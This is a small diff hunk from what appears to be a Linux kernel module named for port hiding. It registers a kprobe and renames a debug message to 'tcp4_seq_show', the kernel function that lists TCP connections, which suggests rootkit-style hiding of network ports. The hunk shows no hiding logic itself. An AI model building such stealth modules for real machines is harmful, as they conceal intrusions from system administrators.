@@ -86,7 +86,7 @@ static int __init port_hide_init(void) {
         pr_err("register_kprobe failed, returned %d\n", ret);
         return ret;
     }
-    dbg_print("port_hide: %px\n", kp.addr);
+    dbg_print("tcp4_seq_show: %px\n", kp.addr);
     return 0;
 }
 
